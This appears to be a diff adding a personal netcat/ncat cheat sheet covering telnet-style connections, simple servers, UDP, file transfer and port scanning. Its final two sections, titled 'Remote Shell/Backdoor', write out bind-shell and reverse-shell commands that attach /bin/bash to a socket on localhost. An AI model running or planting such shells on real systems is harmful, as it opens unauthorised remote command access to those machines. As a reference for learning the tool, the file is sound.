@@ -1,0 +1,141 @@
+#==============================================================================
+# ***** NetCat *****
+#==============================================================================
+
+# 'nc' and 'ncat' are vaguely synonmous.
+
+# See: http://www.binarytides.com/netcat-tutorial-for-beginners/
+# See: http://mylinuxbook.com/linux-netcat-command/
+
+#------------------------------------------------------------------------------
+# 1 - Telnet Mode *****
+
+# Connect to port google.com 80 in 'verbose mode'.
+$ nc -v google.com 80
+
+# Connect to port google.com 80 in 'verbose mode' and issue 'HTTP GET'.
+$ nc -v google.com 80
+Connection to google.com 80 port [tcp/http] succeeded!
+GET index.html HTTP/1.1
+
+
+#------------------------------------------------------------------------------
+# 2 - Simple Socket Server Mode *****
+
+
+# A : Chat Server -----
+
+# 'Listen' on port 1234 'verbose mode' for an incoming connection.
+#
+A$ nc -v -l 1234
+
+# Connect to the open socket using 'telnet' 
+#
+B$ telnet localhost 1234
+
+# Connect to the open socket using 'ncat' 
+#
+B$ nc -v localhost 1234
+
+
+# B : Complete ECHO Server -----
+#
+# On disconnection of client socket; listening server process terminates.
+# The -c option can start a new listen phase.
+#
+$ ncat -v -l -p 5555 -c 'while true; do read i && echo [echo] $i; done'
+
+
+# C : UDP Client / Server -----
+#
+# The 'u' paramter can be used to utilise 'UDP' instead of the 'TCP' default.
+#
+A$ nc -v -ul 7000
+B$ nc localhost -u 7000
+
+
+# D : OUTPUT PIPING -----
+#
+# Pipe the output to a file. Obviously.
+#
+nc -l -v 1234 > data.txt
+
+
+
+#------------------------------------------------------------------------------
+# 3 - File Transfer *****
+
+# Machine A - Send File [Pipe contents of file to ncat; and listen on 5555]
+#
+# NB: Closes down after first file is sent.
+#
+A$ cat happy.txt | ncat -v -l -p 5555
+Ncat: Version 5.21 ( http://nmap.org/ncat )
+Ncat: Listening on 0.0.0.0:5555
+
+# Machine B - Recieve File [Connect to 5555 and pipe to file.]
+#
+B$ ncat localhost 5555 > happy_copy.txt
+
+
+
+#------------------------------------------------------------------------------
+# 4 - Port Scanning *****
+#
+# Params
+# -n - Prevents DNS lookup.
+# -z - Makes nc not receive any data from the server. 
+# -w - Makes the connection timeout after 1 second of inactivity.
+#
+# NB: 'nmap' is a better tool for port scanning.
+#
+$ nc -v -n -z -w 1 192.168.1.2 75-85
+
+
+
+#------------------------------------------------------------------------------
+# 4 - Remote Shell/Backdoor *****
+#
+
+
+# Start a server on port 7777 and will pass all incoming input to bash command 
+# and the results will be send back. The command basically converts the bash 
+# program into a server. So netcat can be used to convert any process into a 
+# server.
+#
+# Params
+# -e - Pipe recieved content into the specified executable (bash shell).
+#
+A$ ncat -v -l -p 7777 -e /bin/bash
+
+# Connect to this bash shell using nc from another terminal
+#
+B$ nc localhost 7777
+
+
+
+
+#------------------------------------------------------------------------------
+# 5 - Remote Shell/Backdoor *****
+#
+
+
+# Machine A - To wait for incoming connections, a local socket listener has to be 
+£ opened.
+#
+A$ ncat -v -l -p 8888
+Ncat: Version 6.00 ( http://nmap.org/ncat )
+Ncat: Listening on :::8888
+Ncat: Listening on 0.0.0.0:8888
+
+
+# Machine B - Force machine B to pass an ncat instance attatched to a shell.
+#
+B$ ncat localhost 8888 -e /bin/bash
+
+
+
+
+
+
+
